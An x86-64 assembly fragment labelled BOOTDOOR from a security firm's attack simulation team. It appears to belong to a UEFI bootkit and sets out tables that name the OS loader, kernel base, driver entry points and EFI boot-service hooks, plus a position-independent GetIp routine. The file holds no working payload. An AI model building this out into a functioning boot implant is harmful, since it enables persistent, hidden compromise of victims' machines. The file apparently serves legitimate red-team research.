;;
;; BOOTDOOR
;;
;; GuidePoint Security LLC
;;
;; Threat and Attack Simulation Team
;;
[BITS 64]

GLOBAL OslCg
GLOBAL RnTbl
GLOBAL EfTbl
GLOBAL GetIp

[SECTION .text$C]

OslCg:
	resb	16
	resb	14

RnTbl:
	;;
	;; RnTbl:
	;;	BufferSize
	;;	BufferBase
	;;	KernelBase
	;;	ImageAddressPhy
	;;	ImageAddressVir
	;;	TargetDriverSection
	;;	TargetDriverImageBase
	;;	TargetDriverLoaderEntry
	;;	TargetDriverAddressOfEntryPoint
	dd	0
	dq	0
	dq	0
	dq	0
	dq	0
	dq	0
	dq	0
	dq	0
	dd	0

EfTbl:
	;;
	;; EfTbl:
	;;	ExitBootServices
	;;	SetVirtualAddressMap
	;;
	dq	0
	dq	0

GetIp:
	;;
	;; Execute Next Instruction
	;;
	call	get_ret_ptr

	get_ret_ptr:
	;;
	;; Get return address
	;;
	pop	rax

	;;
	;; Subtract difference
	;;
	sub	rax, 5

	;;
	;; Return
	;;
	ret

Leave:
	db 'E', 'N', 'D', 'O', 'F', 'C', 'O', 'D', 'E'
